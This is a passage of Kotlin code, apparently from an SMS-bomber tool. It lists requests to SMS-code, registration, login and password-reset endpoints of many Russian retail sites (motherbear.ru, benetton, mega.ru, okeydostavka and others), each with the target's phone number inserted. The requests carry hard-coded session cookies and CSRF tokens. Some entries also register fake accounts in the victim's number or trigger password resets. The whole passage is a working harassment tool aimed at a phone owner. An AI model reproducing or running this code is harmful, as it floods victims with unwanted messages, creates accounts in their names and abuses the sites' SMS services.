            add("phone", phone.format("+7 (***) ***-**-**"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://motherbear.ru/api/auth/phone-confirmation"

        headers {
            add("Content-Type", "application/json")
            add("authority", "motherbear.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "PHPSESSID=p2sEOHNFCQnAl8wfUDoLeg6YxIjk7vjF; MB_USER_LOCATION=77177; MB_SALE_UID=33ac40fcc8d56dbf05d40c85bb7d5483; rrpvid=331046240972116; _userGUID=0:llp418ot:iiVnfpZitAKm2NDnYqErKaY9~aAanBYL; dSesn=55ee3b26-f98c-b0a8-d59c-49730e28d05e; _dvs=0:llp418ot:4QkfXF4Dac1jv2qrbVynlTPXitpN~UEm; digi_uc=W10=; rcuid=64bff15d833c6767f1bdb21e; _ga=GA1.2.1298411268.1692878306; _gid=GA1.2.231502442.1692878306; _gat_UA-255475609-1=1; _ym_uid=1692878306281933750; _ym_d=1692878306; tmr_lvid=162aeadc849898fcb86988984505bb94; tmr_lvidTS=1692878306388; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1692878308749; _ga_2M27TCBDSR=GS1.1.1692878305.1.1.1692878326.0.0.0"
            )
            add("origin", "https://motherbear.ru")
            add("referer", "https://motherbear.ru/catalog/rasprodazha/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"data\":{\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"isConfirmed\":true},\"sessid\":\"0ff317426138d22a8dcf4f2651836939\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://cheese-cake.ru/Auth/SmsAuthRequest"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "cheese-cake.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "__RequestVerificationToken=zKURKqrSZ5nJokZvMdJHD42ye3MsQjjTHp9AXep4mExY3b0WVWzai0uL2cqmSXtXJ6z3xGVtoXOcFIefWrMqW6j742fzWl75PkJ4MxQp3641; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-08-24%2015%3A01%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fcheese-cake.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-08-24%2015%3A01%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fcheese-cake.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36%20Edg%2F116.0.1938.54; _gcl_au=1.1.1017385081.1692878496; rrpvid=90200629212491; _ym_uid=1692878496472533323; _ym_d=1692878496; rcuid=64bff15d833c6767f1bdb21e; _ga=GA1.2.2125280469.1692878497; _gid=GA1.2.69152500.1692878497; tmr_lvid=2174be8d6761f5aaee2b1776b3ba8695; tmr_lvidTS=1692878496625; _ym_isad=2; _ym_visorc=w; __city=14; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcheese-cake.ru%2F; tmr_detect=0%7C1692878502853"
            )
            add("origin", "https://cheese-cake.ru")
            add("referer", "https://cheese-cake.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phone", phone.format("+7(***)***-**-**"))
            add(
                "__RequestVerificationToken",
                "3wWYq8xVqQNuVWpgr_LhsGN5rjMBjGpAs2XGD2nVHOKZrnmsGl2aJ2Ccb7ufa-gWEGJfmBznqCFuf0e4dJBDNwn3bTfyBXuMq_UZkGtpwdQ1"
            )
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://ru.benetton.com/bitrix/services/main/ajax.php") {
            addQueryParameter("mode", "ajax")
            addQueryParameter("c", "benetton:auth")
            addQueryParameter("action", "getRegisterVerificationCode")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "ru.benetton.com")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("bx-ajax", "true")
            add("content-type", "application/x-www-form-urlencoded")
            add(
                "cookie",
                "PHPSESSID=r8Q4DsyDVKkX6ZtrWld0JHybf1w4snEN; BITRIX_SM_GUEST_ID=35760378; BITRIX_SM_SALE_UID=199489094; _userGUID=0:llp4ij2h:gXgNELTBePKufa650bpwfujlEctU2Eg2; ssaid=6909dea0-4277-11ee-8fcd-b7d84f0f4146; __tld__=null; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A6%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; tmr_lvid=a442989ebe4f5d7d164fc4fc1f50c1ff; tmr_lvidTS=1692879112705; _gcl_au=1.1.1965077054.1692879113; flocktory-uuid=d294ccf6-eed5-49ad-95d3-8932f969c2cf-6; _gid=GA1.2.1268043752.1692879113; _gat_ddl=1; _tt_enable_cookie=1; _ttp=YA9TbRSbCy98i7TfimbagfMsw90; adrdel=1; adrcid=A7lTDUpEU8d_SADhWeO-eFg; _ga=GA1.1.1312248366.1692879113; _ga_BPG3Q0TK75=GS1.2.1692879113.1.0.1692879113.0.0.0; lastTransactionId=false; FPLC=gZ7f8F2q64H1W3Xv37dHKg9rTVZA%2Fvzk36oTxWvuJqrRFc8O4%2FYF3prWXctHrU6VmOJZq1556JZSwJZ3dkyPgrKHJhtJzgmaB2Oik%2FPzeu9JHqORI%2BA04rmHoU97cQ%3D%3D; FPID=FPID2.2.pXaJmPe%2F1ukF2CKcjBwFHh8cLeXzQqwAOsMKNbDBVwc%3D.1692879113; lp_pageview_973=1; _ga_ZH4FJXV0C6=GS1.2.1692879113.1.0.1692879113.0.0.0; lp_vid_973=f2b7e369-d924-4891-d503-e56970a80385; lp_session_start_973=1692879114570; lp_session_973=1057405; lp_abtests_973=[]; SIZEBAY_SESSION_ID_V4=12015D322FB335dcdcfb788c47358b25d66c62e39312; tmr_detect=0%7C1692879115074; _ym_uid=1692879116912245511; _ym_d=1692879116; user_unic_ac_id=35964f01-56a5-abb1-f03b-25dfe6a9e457; advcake_session=1; _ym_isad=2; _ym_visorc=w; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; lp_subscibeshow_973=1057405; lp_displays_973={\"73263\":2}; lp_widgets_973={\"73263\":1692879116940}; _ga_CN8V82DH41=GS1.1.1692879113.1.0.1692879119.0.0.0; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; BITRIX_SM_LAST_VISIT=24.08.2023%2015%3A12%3A04; _ga_74V8GH3CVE=GS1.1.1692879112.1.1.1692879134.38.0.0"
            )
            add("origin", "https://ru.benetton.com")
            add("referer", "https://ru.benetton.com/sale/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-bitrix-csrf-token", "6b9b5093ef16886b8caf738ee7811033")
            add("x-bitrix-site-id", "s1")
        }

        formBody {
            add("phone", phone.format("+7 (***) ***-**-**"))
        }
    },

    service(7) {
        url("https://kck.mega.ru/realms/mega_prod_customers/sms/registration-code") {
            addQueryParameter("phoneNumber", phone.toString())
        }

        headers {
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "AUTH_SESSION_ID=1eb9b4cf-8aa7-47e2-8047-a819d2001ced.keycloak-5c6d5fb6f9-fdkzb-23511; AUTH_SESSION_ID_LEGACY=1eb9b4cf-8aa7-47e2-8047-a819d2001ced.keycloak-5c6d5fb6f9-fdkzb-23511; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI3NzQzMzhjMC1hNTc2LTQ4MzktOTFjNi1jZDU2ODFiMTA2NGEifQ.eyJjaWQiOiJjbGllbnRfd2ViIiwicHR5Ijoib3BlbmlkLWNvbm5lY3QiLCJydXJpIjoiaHR0cHM6Ly9tZWdhLnJ1L2xvZ2luLyIsImFjdCI6IkFVVEhFTlRJQ0FURSIsIm5vdGVzIjp7InNjb3BlIjoicHJvZmlsZSBlbWFpbCIsImlzcyI6Imh0dHBzOi8va2NrLm1lZ2EucnUvcmVhbG1zL21lZ2FfcHJvZF9jdXN0b21lcnMiLCJyZXNwb25zZV90eXBlIjoiY29kZSIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX2FwcHJvdmFsX3Byb21wdCI6ImF1dG8iLCJyZWRpcmVjdF91cmkiOiJodHRwczovL21lZ2EucnUvbG9naW4vIiwic3RhdGUiOiI2N2VkMWVhZmI2MGQ4N2M0OWI3M2Q3N2NmMTViNzU0MiJ9fQ.Sb612ykL-oLq5-9x4hJGo_7vae7C9OrgrT-mUzzysUk; PHPSESSID=sM0pGEwsuv32rEzI5HKMUxuK3Fg07b9M; geo=teplyi_stan; _gid=GA1.2.841377362.1692879294; _gat_UA-5557003-1=1; _gat_UA-185941007-2=1; _ym_uid=1692879294720905111; _ym_d=1692879294; tmr_lvid=0b5d9b56188a44a3f491a8d1185a0413; tmr_lvidTS=1692879294213; _ym_isad=2; _ym_visorc=b; consent_cookie_settings=%7B%22performance%22%3Atrue%2C%22promotional%22%3Atrue%7D; SERVER=oprd-k8sw01; _ga=GA1.1.916594117.1692879294; _ga_JKT5T6JWJ2=GS1.1.1692879293.1.1.1692879317.36.0.0"
            )
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://krasnodar.santeh.guru/index.php") {
            addQueryParameter("dispatch", "profiles.fast_login")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "krasnodar.santeh.guru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "cf_chl_2=72b4e4d5cb2813a; cf_clearance=aO9JNDNELwIMJ0c.2imEVCv3JFDZ5cHDTWA12EX7djQ-1692887607-0-1-af1c11fb.bea89ff7.f81d4e1b-160.0.0; sid_customer_a273e=8754795a7d7e32c1ed2075fa51544768-2-C; _gcl_au=1.1.435892289.1692887612; _ga_G9CXZR308L=GS1.1.1692887612.1.0.1692887612.0.0.0; _gid=GA1.2.1197067266.1692887612; _gat_UA-198223783-1=1; _gat_gtag_UA_198223783_1=1; ab__device=desktop; _ym_uid=1692887612384247640; _ym_d=1692887612; _ga_EJH3YC17L1=GS1.1.1692887612.1.0.1692887612.0.0.0; _ga=GA1.1.1140786195.1692887612; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=I3UMJoeC2lnTfQBoscAPI0VD9kvlmi49"
            )
            add("origin", "https://krasnodar.santeh.guru")
            add("referer", "https://krasnodar.santeh.guru/santehnika/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("user_fast_login[phone]", phone.format("+7 *** *** ** **"))
            add("user_fast_login[is_vendor]", "false")
            add("is_ajax", "1")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://www.okeydostavka.ru/wcs/resources/mobihub023/store/13151/loyalty/profile/profile") {
            addQueryParameter("confirmChannel", "C")
        }

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Content-Language", "ru-RU")
            add(
                "Cookie",
                "qrator_jsr=1692889524.324.3kj2H872NggYtUfv-94kagqev3ae06dhluprp34lf03b1furg-00; qrator_jsid=1692889524.324.3kj2H872NggYtUfv-avgobtsq9jsmnn2dkmj4s1gpvpojf1kn; solarfri=bf27b44aae3020d8; qrator_ssid=1692889524.899.1tkaxIJyveYzdmkw-nc589tp17esejrsc3e20akd8rlses8lo; JSESSIONID=0000XWFmD2fjO_4RvLA5ab8Jo-V:-1; storeGroup=msk1; ffcId=13151; WC_SESSION_ESTABLISHED=true; _ga=GA1.1.924006485.1692889526; _ym_uid=1692889526222390304; _ym_d=1692889526; _ym_isad=2; gtmListKey=GTM_LIST_RECOMENDATIONS; isNative=1; selectedStore=10151_13151; selectedCity=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; WC_ACTIVEPOINTER=-20%2C10151; _ga_VBYWB70QLD=GS1.1.1692889525.1.1.1692889599.60.0.0; WC_AUTHENTICATION_52674769=52674769%2CLjzV3x2YXADHVJD4iqk7ErvClklGpVEvPysQpNPMkbk%3D; WC_USERACTIVITY_52674769=52674769%2C10151%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1877362032%2Cver_1692889600440%2C%2Ba5aoljoe4rwxRgMljSvB3j7VH8a6Tl%2FnZUhO6o04sPXCZAhynugqP8ceupi4oj7O6aOjr%2FsOscqf845vjeicjco7hpz1UJVXID3FdWRE4sM%2FXQ8wO%2BGzIDrzFKRS02YYmcva2iT8XQoyW7X5D6l25OO4ANes5Kz4Xksqo1Cd%2Fbu3ZnzJdWyOzgqjMazQQeRwaQsyCEbWAqoGEhIjLMlaI%2B9GotfDnIuTlL8ZSKiNxbTXnTVVN3p43r%2FUF%2F%2BNDf%2Fdtoqw7SjfHaMkNbiQ%2FTL9g%3D%3D"
            )
            add("Origin", "https://www.okeydostavka.ru")
            add(
                "Referer",
                "https://www.okeydostavka.ru/webapp/wcs/stores/servlet/UserRegistrationForm?myAcctMain=1&new=Y&catalogId=12051&langId=-20&storeId=10151"
            )
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"profile\":{\"firstName\":\"П$phone\",\"lastName\":\"П$phone\",\"email\":\"b${phone}588@runfons.com\",\"phone\":\"$phone\",\"birthday\":\"2001-01-01\",\"middleName\":\"Пкупукпку\",\"genderCode\":\"1\",\"password\":\"gergregergergerg\",\"allowPersonalDataProcessing\":\"true\",\"allowEmail\":\"false\",\"allowSms\":\"false\",\"allowEReciept\":\"false\"}}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://dostavka.phali-hinkali.ru/profile/signup"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "advanced-frontend=hflee5275fdla48vj9a70sthnd; _csrf-frontend=fe8f42544e29107e40547eca4a67f94ae00ce42a7f6b2217ec63af169f9d6abca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22EL62PoKpL5dNxBgpxjLPCCS5yXw0zAV6%22%3B%7D; _gcl_au=1.1.2040488804.1692890205; _ga_C7SR1JKQ2N=GS1.1.1692890206.1.0.1692890206.60.0.0; _uc_referrer=direct; _ga=GA1.2.164475344.1692890206; _gid=GA1.2.611641402.1692890207; _gat_gtag_UA_166806145_1=1; _ym_uid=1692890209960272387; _ym_d=1692890209; _ym_isad=2; _ym_visorc=w"
            )
            add("Origin", "https://dostavka.phali-hinkali.ru")
            add("Referer", "https://dostavka.phali-hinkali.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add(
                "X-CSRF-Token",
                "DzeunjakdC6sUH99Iy1DPCvxF2-61DfB7T_KrUpvHDNKe5isZss_XuBlGzNbbyRMU5tbP_mXZPSUZ72dMC5KBQ=="
            )
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add(
                "_csrf-frontend",
                "DzeunjakdC6sUH99Iy1DPCvxF2-61DfB7T_KrUpvHDNKe5isZss_XuBlGzNbbyRMU5tbP_mXZPSUZ72dMC5KBQ=="
            )
            add("SignupForm[phone]", phone.format("+7 (***) ***-**-**"))
            add("SignupForm[name]", "Илья")
        }

        onSuccess { _, _ ->
            method = RequestBuilder.POST
            url = "https://dostavka.phali-hinkali.ru/profile/reset-pass"

            headers {
                add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                add("Accept", "application/json, text/javascript, */*; q=0.01")
                add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
                add("Connection", "keep-alive")
                add(
                    "Cookie",
                    "advanced-frontend=hflee5275fdla48vj9a70sthnd; _csrf-frontend=fe8f42544e29107e40547eca4a67f94ae00ce42a7f6b2217ec63af169f9d6abca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22EL62PoKpL5dNxBgpxjLPCCS5yXw0zAV6%22%3B%7D; _gcl_au=1.1.2040488804.1692890205; _ga_C7SR1JKQ2N=GS1.1.1692890206.1.0.1692890206.60.0.0; _uc_referrer=direct; _ga=GA1.2.164475344.1692890206; _gid=GA1.2.611641402.1692890207; _ym_uid=1692890209960272387; _ym_d=1692890209; _ym_isad=2; _ym_visorc=w"
                )
                add("Origin", "https://dostavka.phali-hinkali.ru")
                add("Referer", "https://dostavka.phali-hinkali.ru/")
                add("Sec-Fetch-Dest", "empty")
                add("Sec-Fetch-Mode", "cors")
                add("Sec-Fetch-Site", "same-origin")
                add(
                    "X-CSRF-Token",
                    "DzeunjakdC6sUH99Iy1DPCvxF2-61DfB7T_KrUpvHDNKe5isZss_XuBlGzNbbyRMU5tbP_mXZPSUZ72dMC5KBQ=="
                )
                add("X-Requested-With", "XMLHttpRequest")
                add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
                add("sec-ch-ua-mobile", "?0")
                add("sec-ch-ua-platform", "\"Windows\"")
            }

            formBody {
                add("phone", phone.format("+7 (***) ***-**-**"))
                add(
                    "_csrf-frontend",
                    "DzeunjakdC6sUH99Iy1DPCvxF2-61DfB7T_KrUpvHDNKe5isZss_XuBlGzNbbyRMU5tbP_mXZPSUZ72dMC5KBQ=="
                )
            }
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://101internet.ru/auth/local/registration"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "uuid=1a46fc1d-8d5f-4e13-b942-3fe610c3bcbb; AB_Test123={\"name\":\"C\",\"weight\":2}; current_region=23; ABMap=[\"AB_Test123\"]; firstURL=/krasnodar/providers/krasnodartelecom; isViewDetectRegion=false; metriksVisitor=true; _ym_uid=1692891794532917818; _ym_d=1692891794; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.1574331305.1692891794; _gid=GA1.2.928959954.1692891794; _gat_UA-17096141-5=1"
            )
            add("Origin", "https://101internet.ru")
            add("Referer", "https://101internet.ru/krasnodar/providers/krasnodartelecom")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("login", phone.toString())
            add("name", "Иван")
            add("password", "qwerty$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://tataev-market.ru/bitrix/components/bxmaker/authuserphone.login/ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "tataev-market.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=MT0id7vlchk3HbMM7i0wwvn4bIZQGsq9; BITRIX_SM_GUEST_ID=2277148; _ga_GPYJ0FDFCF=GS1.1.1692894448.1.0.1692894448.0.0.0; _ga=GA1.1.117869821.1692894448; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A3%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1692894449112917035; _ym_d=1692894449; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ym_isad=2; _ym_visorc=w; BITRIX_SM_LAST_VISIT=24.08.2023%2019%3A27%3A30"
            )
            add("origin", "https://tataev-market.ru")
            add("referer", "https://tataev-market.ru/krasnodar/catalog/posuda/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("method", "sendCode")
            add("phone", phone.format("+7 (***) ***-**-**"))
            add("registration", "Y")
            add("siteId", "s1")
            add("template", ".default.a0ef24001c89acffce58b6105b44dfb4fee7163ea87b7988dc1a1a5efe4f7d8a")
            add(
                "parameters",
                "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.598974baead770954e50db59854b95ad2c82c32378f52af2c3b3d6f933fcd382"
            )
            add("sessid", "9aa8222d83f82d7b0d01bfcda34bb538")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.modi.ru/ajax/phone_sms_code.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "www.modi.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=dbiAZD4xqFmfr4ahIrVygGa52OVZh2WG; BITRIX_SM_GUEST_ID=469701; tmr_lvid=8471ba0a8e2471c67b983b24319dbf40; tmr_lvidTS=1692894593178; _ym_uid=1692894593946793636; _ym_d=1692894593; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ym_visorc=w; _tt_enable_cookie=1; _ttp=5t1nthz0K5yrBLThCA6d69GOjyj; user_unic_ac_id=bc409e72-4487-8feb-762f-ad31ec7e12fa; advcake_session=1; tmr_detect=0%7C1692894595949; BITRIX_SM_LAST_VISIT=24.08.2023%2019%3A29%3A57"
            )
            add("origin", "https://www.modi.ru")
            add("referer", "https://www.modi.ru/personal/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("sessid", "b97eda5fbb6edc6265396e4746b2bae9")
            add("PHONE", phone.format("+7 *** *** ** **"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://aryahome.ru/bitrix/components/cosovan/authuserphone.call/ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "aryahome.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=pI3XCTGRr64GrzLxOLS80BP0kH7aVsfr; ARYA_ASPRO_SALE_UID=7a1334b49f6e998e29ada7c33e452676; _gcl_au=1.1.1106417843.1692894684; _userGUID=0:llpdsa4a:pwaVX_ero1kjRhTphnjYizKrpsg0Pg_I; _ym_debug=null; BITRIX_CONVERSION_CONTEXT_MG=%7B%22ID%22%3A135%2C%22EXPIRE%22%3A1692910740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; tmr_lvid=35bb6e199e22bae4cece693e75cebc4c; tmr_lvidTS=1692894684424; rrpvid=562061522648836; _ym_uid=1692894685471126901; _ym_d=1692894685; rcuid=64bff15d833c6767f1bdb21e; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1692894686846"
            )
            add("origin", "https://aryahome.ru")
            add("referer", "https://aryahome.ru/auth/registration/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("sessid", "389b4407c5eb19bc068352b2735a1c98")
            add(
                "parameters",
                "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.bd70734a05324217ad24047ab3c0d487bf4b5b45893e9cffe9c0dd05b544f43b"
            )
            add("template", "new.68304ce85c953bc1715dc730dfdec821f232f6dc17731b914a1fb02795a1d3b5")
            add("siteId", "MG")
            add("method", "sendCode")
            add("phone", "+$phone")
        }
    }
)
